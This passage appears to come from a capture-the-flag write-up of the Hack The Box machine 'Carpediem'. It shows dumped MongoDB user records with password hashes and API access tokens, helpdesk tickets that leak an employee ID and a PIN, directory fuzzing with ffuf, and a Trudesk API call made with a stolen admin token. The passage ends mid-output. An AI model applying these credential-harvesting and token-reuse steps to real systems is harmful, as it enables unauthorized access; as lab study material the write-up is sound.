+<span id="cb18-33"><a href="#cb18-33" aria-hidden="true" tabindex="-1"></a><span class="kw">{</span> <span class="st">"_id"</span> : ObjectId<span class="er">(</span><span class="st">"6243c3471e0d4d001b0740d7"</span><span class="kw">)</span><span class="ex">,</span> <span class="st">"preferences"</span> : { <span class="st">"tourCompleted"</span> : false, <span class="st">"autoRefreshTicketGrid"</span> : true, <span class="st">"openChatWindows"</span> : [ ] }, <span class="st">"hasL2Auth"</span> : false, <span class="st">"deleted"</span> : false, <span class="st">"username"</span> : <span class="st">"acooke"</span>, <span class="st">"email"</span> : <span class="st">"acooke@carpediem.htb"</span>, <span class="st">"password"</span> : <span class="st">"</span><span class="va">$2</span><span class="st">b</span><span class="va">$1</span><span class="st">0</span><span class="va">$qZ64GjhVYetulM</span><span class="st">.dqt73zOV8IjlKYKtM/NjKPS1PB0rUcBMkKq0s."</span>, <span class="st">"fullname"</span> : <span class="st">"Adeanna Cooke"</span>, <span class="st">"title"</span> : <span class="st">"Director - Human Resources"</span>, <span class="st">"role"</span> : ObjectId<span class="er">(</span><span class="st">"623c8b20855cc5001a8ba139"</span><span class="kw">)</span><span class="ex">,</span> <span class="st">"accessToken"</span> : <span class="st">"9c7ace307a78322f1c09d62aae3815528c3b7547"</span>, <span class="st">"__v"</span> : 0, <span class="st">"lastOnline"</span> : ISODate<span class="er">(</span><span class="st">"2022-03-30T14:21:15.212Z"</span><span class="kw">)</span> <span class="kw">}</span></span>
+<span id="cb18-34"><a href="#cb18-34" aria-hidden="true" tabindex="-1"></a><span class="kw">{</span> <span class="st">"_id"</span> : ObjectId<span class="er">(</span><span class="st">"6243c69d1acd1559cdb4019b"</span><span class="kw">)</span><span class="ex">,</span> <span class="st">"preferences"</span> : { <span class="st">"tourCompleted"</span> : false, <span class="st">"autoRefreshTicketGrid"</span> : true, <span class="st">"openChatWindows"</span> : [ ] }, <span class="st">"hasL2Auth"</span> : false, <span class="st">"deleted"</span> : false, <span class="st">"username"</span> : <span class="st">"svc-portal-tickets"</span>, <span class="st">"email"</span> : <span class="st">"tickets@carpediem.htb"</span>, <span class="st">"password"</span> : <span class="st">"</span><span class="va">$2</span><span class="st">b</span><span class="va">$1</span><span class="st">0</span><span class="va">$CSRmXjH</span><span class="st">/psp9DdPmVjEYLOUEkgD7x8ax1S1yks4CTrbV6bfgBFXqW"</span>, <span class="st">"fullname"</span> : <span class="st">"Portal Tickets"</span>, <span class="st">"title"</span> : <span class="st">""</span>, <span class="st">"role"</span> : ObjectId<span class="er">(</span><span class="st">"623c8b20855cc5001a8ba13a"</span><span class="kw">)</span><span class="ex">,</span> <span class="st">"accessToken"</span> : <span class="st">"f8691bd2d8d613ec89337b5cd5a98554f8fffcc4"</span>, <span class="st">"__v"</span> : 0, <span class="st">"lastOnline"</span> : ISODate<span class="er">(</span><span class="st">"2022-03-30T13:50:02.824Z"</span><span class="kw">)</span> <span class="kw">}</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>The found password hashes are all bcrypt and we will not be able to crack those, instead the <code>accessToken</code> seems interesting.</p>
+<p>Before moving on, lets see if we can find anything interesting from the reported tickets. Below is the heavily cropped data from table <code>tickets</code>:</p>
+<div class="sourceCode" id="cb19"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> db.tickets.find<span class="kw">()</span><span class="fu">.pretty()</span></span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a><span class="kw">{</span></span>
+<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a>    <span class="st">"_id"</span> : ObjectId<span class="er">(</span><span class="st">"624461a6f2c8c07f687ba8a6"</span><span class="kw">)</span><span class="ex">,</span></span>
+<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a>    <span class="st">"subject"</span> : <span class="st">"Security risks - Portal"</span>,</span>
+<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a>    <span class="st">"issue"</span> : <span class="st">"&lt;p&gt;We need to patch the user profile and admin sections of our Portal ASAP. Why are we continually pushing out functions that haven&amp;#39;t been tested by the Infosec team?&lt;/p&gt;\n"</span>,</span>
+<span id="cb19-6"><a href="#cb19-6" aria-hidden="true" tabindex="-1"></a>            <span class="st">"comment"</span> : <span class="st">"&lt;p&gt;Thanks, Jeremy.  I agree.  This is a big problem.&lt;/p&gt;\n"</span></span>
+<span id="cb19-7"><a href="#cb19-7" aria-hidden="true" tabindex="-1"></a><span class="kw">}</span></span>
+<span id="cb19-8"><a href="#cb19-8" aria-hidden="true" tabindex="-1"></a><span class="kw">{</span></span>
+<span id="cb19-9"><a href="#cb19-9" aria-hidden="true" tabindex="-1"></a>    <span class="st">"_id"</span> : ObjectId<span class="er">(</span><span class="st">"6244635c8fc3556ae8715b0f"</span><span class="kw">)</span><span class="ex">,</span></span>
+<span id="cb19-10"><a href="#cb19-10" aria-hidden="true" tabindex="-1"></a>    <span class="st">"subject"</span> : <span class="st">"Username change"</span>,</span>
+<span id="cb19-11"><a href="#cb19-11" aria-hidden="true" tabindex="-1"></a>    <span class="st">"issue"</span> : <span class="st">"&lt;p&gt;I need a handle, man.  I mean, I don&amp;#39;t have an identity until I have a handle.&lt;br /&gt;How about The Master of Disaster?&lt;/p&gt;\n"</span>,</span>
+<span id="cb19-12"><a href="#cb19-12" aria-hidden="true" tabindex="-1"></a>            <span class="st">"comment"</span> : <span class="st">"&lt;p&gt;You&amp;#39;re hopelss, man.  Utterly hopeless.&lt;/p&gt;\n&lt;p&gt;I&amp;#39;m closing this ticket.&lt;/p&gt;\n"</span></span>
+<span id="cb19-13"><a href="#cb19-13" aria-hidden="true" tabindex="-1"></a><span class="kw">}</span></span>
+<span id="cb19-14"><a href="#cb19-14" aria-hidden="true" tabindex="-1"></a><span class="kw">{</span></span>
+<span id="cb19-15"><a href="#cb19-15" aria-hidden="true" tabindex="-1"></a>    <span class="st">"_id"</span> : ObjectId<span class="er">(</span><span class="st">"624465135596178468330932"</span><span class="kw">)</span><span class="ex">,</span></span>
+<span id="cb19-16"><a href="#cb19-16" aria-hidden="true" tabindex="-1"></a>    <span class="st">"issue"</span> : <span class="st">"&lt;p&gt;We have hired a new Network Engineer and need to get him set up with his credentials and phone before his start date next month.&lt;br /&gt;Please create this account at your earliest convenience.&lt;br /&gt;&lt;br /&gt;Thank you.&lt;/p&gt;\n"</span>,</span>
+<span id="cb19-17"><a href="#cb19-17" aria-hidden="true" tabindex="-1"></a>            <span class="st">"comment"</span> : <span class="st">"&lt;p&gt;Hey Adeanna,&lt;br&gt;I think Joey is out this week, but I can take care of this. Whats the last 4 digits of his employee ID so I can get his extension set up in the VoIP system?&lt;/p&gt;\n"</span></span>
+<span id="cb19-18"><a href="#cb19-18" aria-hidden="true" tabindex="-1"></a>            <span class="st">"comment"</span> : <span class="st">"&lt;p&gt;Thanks Robert,&lt;br&gt;Last 4 of employee ID is 9650.&lt;/p&gt;\n"</span></span>
+<span id="cb19-19"><a href="#cb19-19" aria-hidden="true" tabindex="-1"></a>            <span class="st">"comment"</span> : <span class="st">"&lt;p&gt;Thank you! He&amp;#39;s all set up and ready to go. When he gets to the office on his first day just have him log into his phone first. I&amp;#39;ll leave him a voicemail with his initial credentials for server access. His phone pin code will be 2022 and to get into voicemail he can dial *62&lt;/p&gt;\n&lt;p&gt;Also...let him know that if he wants to use a desktop soft phone that we&amp;#39;ve been testing Zoiper with some of our end users.&lt;/p&gt;\n&lt;p&gt;Changing the status of this ticket to pending until he&amp;#39;s been set up and changes his initial credentials.&lt;/p&gt;\n"</span></span>
+<span id="cb19-20"><a href="#cb19-20" aria-hidden="true" tabindex="-1"></a><span class="kw">}</span></span>
+<span id="cb19-21"><a href="#cb19-21" aria-hidden="true" tabindex="-1"></a><span class="kw">{</span></span>
+<span id="cb19-22"><a href="#cb19-22" aria-hidden="true" tabindex="-1"></a>    <span class="st">"_id"</span> : ObjectId<span class="er">(</span><span class="st">"6244673c2142479dd493d9da"</span><span class="kw">)</span><span class="ex">,</span></span>
+<span id="cb19-23"><a href="#cb19-23" aria-hidden="true" tabindex="-1"></a>    <span class="st">"subject"</span> : <span class="st">"Trudesk API access - Portal"</span>,</span>
+<span id="cb19-24"><a href="#cb19-24" aria-hidden="true" tabindex="-1"></a>    <span class="st">"issue"</span> : <span class="st">"&lt;p&gt;I&amp;#39;ll be looking into tightenting up security permissions this week for the Trudesk integration in the Portal.  We&amp;#39;ll need to also perform some threat modeling to find out where our weak points are and come up with an action plan to mitigate.&lt;/p&gt;\n"</span>,</span>
+<span id="cb19-25"><a href="#cb19-25" aria-hidden="true" tabindex="-1"></a><span class="kw">}</span></span>
+<span id="cb19-26"><a href="#cb19-26" aria-hidden="true" tabindex="-1"></a><span class="kw">{</span></span>
+<span id="cb19-27"><a href="#cb19-27" aria-hidden="true" tabindex="-1"></a>    <span class="st">"_id"</span> : ObjectId<span class="er">(</span><span class="st">"62478d83eadb13001b66b62c"</span><span class="kw">)</span><span class="ex">,</span></span>
+<span id="cb19-28"><a href="#cb19-28" aria-hidden="true" tabindex="-1"></a>    <span class="st">"subject"</span> : <span class="st">"Need help building the CMS"</span>,</span>
+<span id="cb19-29"><a href="#cb19-29" aria-hidden="true" tabindex="-1"></a>    <span class="st">"issue"</span> : <span class="st">"&lt;p&gt;Hey Jeremy, &lt;br /&gt;Can you help me work on the CMS at all this week?  The base install is completed, but I need your expertise to make sure I did everything correctly.&lt;/p&gt;\n"</span>,</span>
+<span id="cb19-30"><a href="#cb19-30" aria-hidden="true" tabindex="-1"></a>            <span class="st">"comment"</span> : <span class="st">"&lt;p&gt;Please don&amp;#39;t expose that application publically.  I told you I would help when I had time and right now I&amp;#39;m just too busy.&lt;br&gt;Build it out if you&amp;#39;d like, but...just don&amp;#39;t do anything stupid.&lt;/p&gt;\n"</span></span>
+<span id="cb19-31"><a href="#cb19-31" aria-hidden="true" tabindex="-1"></a>            <span class="st">"comment"</span> : <span class="st">"&lt;p&gt;Don&amp;#39;t worry. I moved it off of the main server and into a container with SSL encryption.&lt;/p&gt;\n"</span></span>
+<span id="cb19-32"><a href="#cb19-32" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb19-33"><a href="#cb19-33" aria-hidden="true" tabindex="-1"></a><span class="kw">}</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>The information about the new Network Engineer and the last 4 digits of his employee ID, 9650, and pincode, 2022, might come in handy later. Lets move on with the extracted accessTokens.</p>
+</section>
+<section id="step-5" class="level3">
+<h3 class="anchored" data-anchor-id="step-5">Step 5</h3>
+<p>Setup Burp for upstream socks proxy (User options &gt; SOCKS Proxy) and browse to <code>https://172.17.0.2</code> we find <code>backdrop.carpediem.htb</code>. <br> <img src="images/carpediem11.png" class="img-fluid"></p>
+<p>We’re unable to login to the page and there really isn’t anything of use at first glance. Googling for <em>“backdrop cms exploit”</em> there are a bunch of authenticated exploits, but we have no account..</p>
+<p><img src="images/carpediem12.png" class="img-fluid"> We’d love to find something related to <em>trudesk</em>, lets try to add <code>trudesk.carpediem.htb</code> to resolve to <code>172.17.0.2</code> and if that doesn’t work try <code>10.10.11.167</code>.</p>
+<div class="sourceCode" id="cb20"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  chisel_1.7.7 curl <span class="at">-v</span> http://trudesk.carpediem.htb</span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span>   Trying 10.10.11.167:80...</span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> Connected to trudesk.carpediem.htb <span class="er">(</span><span class="ex">10.10.11.167</span><span class="kw">)</span> <span class="ex">port</span> 80 <span class="er">(</span><span class="co">#0)</span></span>
+<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> GET <span class="ex">/</span> HTTP/1.1</span>
+<span id="cb20-5"><a href="#cb20-5" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> Host: <span class="ex">trudesk.carpediem.htb</span></span>
+<span id="cb20-6"><a href="#cb20-6" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> User-Agent: <span class="ex">curl/7.84.0</span></span>
+<span id="cb20-7"><a href="#cb20-7" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> Accept: <span class="ex">*/*</span></span>
+<span id="cb20-8"><a href="#cb20-8" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> </span>
+<span id="cb20-9"><a href="#cb20-9" aria-hidden="true" tabindex="-1"></a><span class="ex">*</span> Mark bundle as not supporting multiuse</span>
+<span id="cb20-10"><a href="#cb20-10" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> HTTP/1.1 <span class="ex">200</span> OK</span>
+<span id="cb20-11"><a href="#cb20-11" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Server: <span class="ex">nginx/1.18.0</span> <span class="er">(</span><span class="ex">Ubuntu</span><span class="kw">)</span></span>
+<span id="cb20-12"><a href="#cb20-12" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Date: <span class="ex">Tue,</span> 13 Sep 2022 07:26:47 GMT</span>
+<span id="cb20-13"><a href="#cb20-13" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Content-Type: <span class="ex">text/html</span><span class="kw">;</span> <span class="va">charset</span><span class="op">=</span>utf-8</span>
+<span id="cb20-14"><a href="#cb20-14" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Content-Length: <span class="ex">7285</span></span>
+<span id="cb20-15"><a href="#cb20-15" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Connection: <span class="ex">keep-alive</span></span>
+<span id="cb20-16"><a href="#cb20-16" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Access-Control-Allow-Origin: <span class="ex">*</span></span>
+<span id="cb20-17"><a href="#cb20-17" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Access-Control-Allow-Methods: <span class="ex">GET,</span> POST, PUT, DELETE, PATCH, OPTIONS</span>
+<span id="cb20-18"><a href="#cb20-18" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> Access-Control-Allow-Headers: <span class="ex">DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,accesstoken,X-RToken,X-Token</span></span>
+<span id="cb20-19"><a href="#cb20-19" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> ETag: <span class="ex">W/</span><span class="st">"1c75-WUVJYgy+76qLc2hldkHzGR7+Uxg"</span></span>
+<span id="cb20-20"><a href="#cb20-20" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> set-cookie: <span class="ex">connect.sid=s%3AQDzVdnp3FNH7sE1ZglF0wWughDr5QhjC.hjY40%2Blgy48wMb6w4wRA0QLCPSYevILsPC0ClelRiMg</span><span class="kw">;</span> <span class="va">Path</span><span class="op">=</span>/<span class="kw">;</span> <span class="va">Expires</span><span class="op">=</span>Wed, <span class="ex">13</span> Sep 2023 07:26:47 GMT<span class="kw">;</span> <span class="ex">HttpOnly</span></span>
+<span id="cb20-21"><a href="#cb20-21" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span> </span>
+<span id="cb20-22"><a href="#cb20-22" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>!DOCTYPE <span class="ex">html</span><span class="op">&gt;</span></span>
+<span id="cb20-23"><a href="#cb20-23" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>html<span class="op">&gt;</span></span>
+<span id="cb20-24"><a href="#cb20-24" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>head<span class="op">&gt;</span></span>
+<span id="cb20-25"><a href="#cb20-25" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>title<span class="op">&gt;</span>Trudesk <span class="kw">&amp;</span><span class="ex">middot</span><span class="kw">;</span> <span class="ex">Login</span><span class="op">&lt;</span>/title<span class="op">&gt;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="sourceCode" id="cb21"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem ffuf <span class="at">-c</span> <span class="at">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at">-u</span> http://trudesk.carpediem.htb/FUZZ</span>
+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="ex">About</span>                   [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 65ms]</span>
+<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Login</span>                   [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 67ms]</span>
+<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a><span class="ex">about</span>                   [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 86ms]</span>
+<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a><span class="ex">accounts</span>                [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 56ms]</span>
+<span id="cb21-6"><a href="#cb21-6" aria-hidden="true" tabindex="-1"></a><span class="ex">api</span>                     [Status: 200, Size: 25, Words: 1, Lines: 1, Duration: 75ms]</span>
+<span id="cb21-7"><a href="#cb21-7" aria-hidden="true" tabindex="-1"></a><span class="ex">backups</span>                 [Status: 401, Size: 32, Words: 3, Lines: 1, Duration: 83ms]</span>
+<span id="cb21-8"><a href="#cb21-8" aria-hidden="true" tabindex="-1"></a><span class="ex">captcha</span>                 [Status: 200, Size: 9399, Words: 954, Lines: 1, Duration: 120ms]</span>
+<span id="cb21-9"><a href="#cb21-9" aria-hidden="true" tabindex="-1"></a><span class="ex">css</span>                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 87ms]</span>
+<span id="cb21-10"><a href="#cb21-10" aria-hidden="true" tabindex="-1"></a><span class="ex">dashboard</span>               [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 145ms]</span>
+<span id="cb21-11"><a href="#cb21-11" aria-hidden="true" tabindex="-1"></a><span class="ex">departments</span>             [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 84ms]</span>
+<span id="cb21-12"><a href="#cb21-12" aria-hidden="true" tabindex="-1"></a><span class="ex">font</span>                    [Status: 301, Size: 175, Words: 7, Lines: 11, Duration: 43ms]</span>
+<span id="cb21-13"><a href="#cb21-13" aria-hidden="true" tabindex="-1"></a><span class="ex">fonts</span>                   [Status: 301, Size: 177, Words: 7, Lines: 11, Duration: 43ms]</span>
+<span id="cb21-14"><a href="#cb21-14" aria-hidden="true" tabindex="-1"></a><span class="fu">groups</span>                  [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 133ms]</span>
+<span id="cb21-15"><a href="#cb21-15" aria-hidden="true" tabindex="-1"></a><span class="ex">img</span>                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 61ms]</span>
+<span id="cb21-16"><a href="#cb21-16" aria-hidden="true" tabindex="-1"></a><span class="fu">install</span>                 [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 69ms]</span>
+<span id="cb21-17"><a href="#cb21-17" aria-hidden="true" tabindex="-1"></a><span class="ex">js</span>                      [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 99ms]</span>
+<span id="cb21-18"><a href="#cb21-18" aria-hidden="true" tabindex="-1"></a><span class="fu">login</span>                   [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 62ms]</span>
+<span id="cb21-19"><a href="#cb21-19" aria-hidden="true" tabindex="-1"></a><span class="bu">logout</span>                  [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 56ms]</span>
+<span id="cb21-20"><a href="#cb21-20" aria-hidden="true" tabindex="-1"></a><span class="ex">messages</span>                [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 96ms]</span>
+<span id="cb21-21"><a href="#cb21-21" aria-hidden="true" tabindex="-1"></a><span class="ex">mobile</span>                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 158ms]</span>
+<span id="cb21-22"><a href="#cb21-22" aria-hidden="true" tabindex="-1"></a><span class="ex">notices</span>                 [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 106ms]</span>
+<span id="cb21-23"><a href="#cb21-23" aria-hidden="true" tabindex="-1"></a><span class="ex">plugins</span>                 [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 64ms]</span>
+<span id="cb21-24"><a href="#cb21-24" aria-hidden="true" tabindex="-1"></a><span class="ex">profile</span>                 [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 102ms]</span>
+<span id="cb21-25"><a href="#cb21-25" aria-hidden="true" tabindex="-1"></a><span class="ex">register</span>                [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 103ms]</span>
+<span id="cb21-26"><a href="#cb21-26" aria-hidden="true" tabindex="-1"></a><span class="ex">reports</span>                 [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 115ms]</span>
+<span id="cb21-27"><a href="#cb21-27" aria-hidden="true" tabindex="-1"></a><span class="ex">settings</span>                [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 93ms]</span>
+<span id="cb21-28"><a href="#cb21-28" aria-hidden="true" tabindex="-1"></a><span class="ex">signup</span>                  [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 73ms]</span>
+<span id="cb21-29"><a href="#cb21-29" aria-hidden="true" tabindex="-1"></a><span class="ex">sounds</span>                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 100ms]</span>
+<span id="cb21-30"><a href="#cb21-30" aria-hidden="true" tabindex="-1"></a><span class="ex">teams</span>                   [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 152ms]</span>
+<span id="cb21-31"><a href="#cb21-31" aria-hidden="true" tabindex="-1"></a><span class="ex">tickets</span>                 [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 97ms]</span>
+<span id="cb21-32"><a href="#cb21-32" aria-hidden="true" tabindex="-1"></a><span class="ex">uploads</span>                 [Status: 401, Size: 32, Words: 3, Lines: 1, Duration: 68ms]</span>
+<span id="cb21-33"><a href="#cb21-33" aria-hidden="true" tabindex="-1"></a><span class="ex">version</span>                 [Status: 200, Size: 20, Words: 1, Lines: 1, Duration: 58ms]</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="sourceCode" id="cb22"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem curl http://trudesk.carpediem.htb/version</span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="ex">{</span><span class="st">"version"</span><span class="ex">:</span><span class="st">"1.1.11"</span><span class="ex">}</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Googling around I can’t find any publicly disclosed exploits for Trudesk 1.1.11. Reading the <a href="https://docs.trudesk.io/v1/api/#Get">truedesk docs</a> we should use the <code>accessToken</code> as a header, we can verify this by cURL’ign the API using the admin accesstoken:</p>
+<div class="sourceCode" id="cb23"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem curl <span class="at">-H</span> <span class="st">"accesstoken: 22e56ec0b94db029b07365d520213ef6f5d3d2d9"</span> <span class="at">-l</span> http://trudesk.carpediem.htb/api/v1/users</span>
+<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="dt">{</span><span class="st">"success"</span><span class="dt">:true</span><span class="op">,</span><span class="st">"count"</span><span class="dt">:5</span><span class="op">,</span><span class="st">"users"</span><span class="dt">:[{</span><span class="st">"preferences"</span><span class="dt">:{</span><span class="st">"tourCompleted"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"autoRefreshTicketGrid"</span><span class="dt">:true</span><span class="op">,</span><span class="st">"openChatWindows"</span><span class="dt">:[]}</span><span class="op">,</span><span class="st">"hasL2Auth"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"deleted"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"_id"</span><span class="dt">:</span><span class="st">"6243c3471e0d4d001b0740d7"</span><span class="op">,</span><span class="st">"username"</span><span class="dt">:</span><span class="st">"acooke"</span><span class="op">,</span><span class="st">"email"</span><span class="dt">:</span><span class="st">"acooke@carpediem.htb"</span><span class="op">,</span><span class="st">"fullname"</span><span class="dt">:</span><span class="st">"Adeanna Cooke"</span><span class="op">,</span><span class="st">"title"</span><span class="dt">:</span><span class="st">"Director - Human Resources"</span><span class="op">,</span><span class="st">"role"</span><span class="dt">:{</span><span class="st">"_id"</span><span class="dt">:</span><span class="st">"623c8b20855cc5001a8ba139"</span><span class="op">,</span><span class="st">"name"</span><span class="dt">:</span><span class="st">"Support"</span><span class="op">,</span><span class="st">"description"</span><span class="dt">:</span><span class="st">"Default role for agents"</span><span class="op">,</span><span class="st">"normalized"</span><span class="dt">:</span><span class="st">"support"</span><span class="op">,</span><span class="st">"isAdmin"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"isAgent"</span><span class="dt">:true</span><span class="op">,</span><span class="st">"id"</span><span class="dt">:</span><span class="st">"623c8b20855cc5001a8ba139"</span><span class="dt">}</span><span class="op">,</span><span class="st">"lastOnline"</span><span class="dt">:</span><span class="st">"2022-03-30T14:21:15.212Z"</span><span class="op">,</span><span class="st">"id"</span><span class="dt">:</span><span class="st">"6243c3471e0d4d001b0740d7"</span><span class="op">,</span><span class="st">"groups"</span><span class="dt">:[]}</span><span class="op">,</span><span class="dt">{</span><span class="st">"preferences"</span><span class="dt">:{</span><span class="st">"tourCompleted"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"autoRefreshTicketGrid"</span><span class="dt">:true</span><span class="op">,</span><span class="st">"openChatWindows"</span><span class="dt">:[]}</span><span class="op">,</span><span class="st">"hasL2Auth"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"deleted"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"_id"</span><span class="dt">:</span><span class="st">"6243c0be1e0d4d001b0740d4"</span><span class="op">,</span><span class="st">"username"</span><span class="dt">:</span><span class="st">"jhammond"</span><span class="op">,</span><span class="st">"email"</span><span class="dt">:</span><span class="st">"jhammond@carpediem.htb"</span><span class="op">,</span><span class="st">"fullname"</span><span class="dt">:</span><span class="st">"Jeremy Hammond"</span><span class="op">,</span><span class="st">"title"</span><span class="dt">:</span><span class="st">"Sr. Systems Engineer"</span><span class="op">,</span><span class="st">"role"</span><span class="dt">:{</span><span class="st">"_id"</span><span class="dt">:</span><span class="st">"623c8b20855cc5001a8ba139"</span><span class="op">,</span><span class="st">"name"</span><span class="dt">:</span><span class="st">"Support"</span><span class="op">,</span><span class="st">"description"</span><span class="dt">:</span><span class="st">"Default role for agents"</span><span class="op">,</span><span class="st">"normalized"</span><span class="dt">:</span><span class="st">"support"</span><span class="op">,</span><span class="st">"isAdmin"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"isAgent"</span><span class="dt">:true</span><span class="op">,</span><span class="st">"id"</span><span class="dt">:</span><span class="st">"623c8b20855cc5001a8ba139"</span><span class="dt">}</span><span class="op">,</span><span class="st">"lastOnline"</span><span class="dt">:</span><span class="st">"2022-04-01T23:36:55.940Z"</span><span class="op">,</span><span class="st">"id"</span><span class="dt">:</span><span class="st">"6243c0be1e0d4d001b0740d4"</span><span class="op">,</span><span class="st">"groups"</span><span class="dt">:[]}</span><span class="op">,</span><span class="dt">{</span><span class="st">"preferences"</span><span class="dt">:{</span><span class="st">"tourCompleted"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"autoRefreshTicketGrid"</span><span class="dt">:true</span><span class="op">,</span><span class="st">"openChatWindows"</span><span class="dt">:[]}</span><span class="op">,</span><span class="st">"hasL2Auth"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"deleted"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"_id"</span><span class="dt">:</span><span class="st">"6243c28f1e0d4d001b0740d6"</span><span class="op">,</span><span class="st">"username"</span><span class="dt">:</span><span class="st">"jpardella"</span><span class="op">,</span><span class="st">"email"</span><span class="dt">:</span><span class="st">"jpardella@carpediem.htb"</span><span class="op">,</span><span class="st">"fullname"</span><span class="dt">:</span><span class="st">"Joey Pardella"</span><span class="op">,</span><span class="st">"title"</span><span class="dt">:</span><span class="st">"Desktop Support"</span><span class="op">,</span><span class="st">"role"</span><span class="dt">:{</span><span class="st">"_id"</span><span class="dt">:</span><span class="st">"623c8b20855cc5001a8ba139"</span><span class="op">,</span><span class="st">"name"</span><span class="dt">:</span><span class="st">"Support"</span><span class="op">,</span><span class="st">"description"</span><span class="dt">:</span><span class="st">"Default role for agents"</span><span class="op">,</span><span class="st">"normalized"</span><span class="dt">:</span><span class="st">"support"</span><span class="op">,</span><span class="st">"isAdmin"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"isAgent"</span><span class="dt">:true</span><span class="op">,</span><span class="st">"id"</span><span class="dt">:</span><span class="st">"623c8b20855cc5001a8ba139"</span><span class="dt">}</span><span class="op">,</span><span class="st">"lastOnline"</span><span 